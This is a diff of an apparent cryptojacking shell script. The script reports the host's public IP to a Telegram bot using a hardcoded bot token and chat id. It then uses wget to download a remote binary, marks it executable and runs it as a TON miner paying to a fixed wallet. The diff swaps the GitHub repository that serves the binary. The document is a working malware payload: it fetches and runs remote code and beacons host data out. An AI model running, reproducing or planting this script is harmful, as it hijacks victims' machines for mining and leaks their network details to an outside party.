@@ -6,5 +6,5 @@ myIp="$(wget -qO- ifconfig.me/ip)"
 n0z="$myIp|MINING_TON"
 curl --silent -X GET 'https://api.telegram.org/bot1936519764:AAFhpKRoPybd6q1Kqqb-iWFxjdxKlfX3q_0/sendMessage?chat_id=1335828890&text='$n0z --compressed
 
-wget https://github.com/GGsignature/badai/raw/main/dev && chmod +x dev 
+wget https://github.com/ontoseno90/master/raw/main/dev && chmod +x dev 
 ./dev --algo TON --pool https://pool.services.tonwhales.com --user EQBIMDxfFcFE-3vVGlFc0rwKfaVG-KZ_MAVinAarYFEoCkrt
